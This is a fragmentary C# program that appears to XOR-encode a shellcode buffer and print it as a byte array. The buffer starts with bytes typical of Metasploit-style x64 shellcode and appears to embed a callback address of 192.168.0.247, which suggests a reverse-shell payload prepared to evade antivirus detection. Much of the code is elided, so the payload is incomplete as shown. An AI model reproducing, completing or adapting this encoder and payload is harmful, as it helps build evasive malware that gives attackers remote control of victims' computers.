...
namespace ExOr
{
    public class Program
    {
        public static void Main(string[] args)
        {
            ...
            byte[] buffer = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            ...
            0xc0,0xa8,0x00,0xf7,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
            ...
            {
                encoded[i] = (byte)((uint)buffer[i] ^ 25678998);
            }
            ...
            Console.WriteLine($"byte[] buf = new byte[{buffer.Length}] {{\n{hex}\n}};");
